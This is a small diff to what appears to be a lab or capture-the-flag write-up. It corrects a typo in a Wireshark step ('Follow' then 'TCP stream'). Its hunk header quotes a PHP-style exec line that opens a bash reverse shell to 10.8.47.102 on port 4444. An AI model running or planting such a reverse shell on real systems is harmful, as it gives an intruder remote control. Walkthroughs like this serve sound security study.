@@ -128,7 +128,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.47.102/4444 0>&1'");
 <img width="1181" height="358" alt="image" src="https://github.com/user-attachments/assets/65994de1-2c01-42f6-a1c8-2feae5b4b9a4" />
 
 
-> ### click on any Tcp packet then **`Follow`** -> **`TCP streen`**
+> ### click on any Tcp packet then **`Follow`** -> **`TCP stream`**
 
 
 <img width="1874" height="807" alt="image" src="https://github.com/user-attachments/assets/ce26510f-bb10-4e0e-b2e6-2b4b8625cff9" />
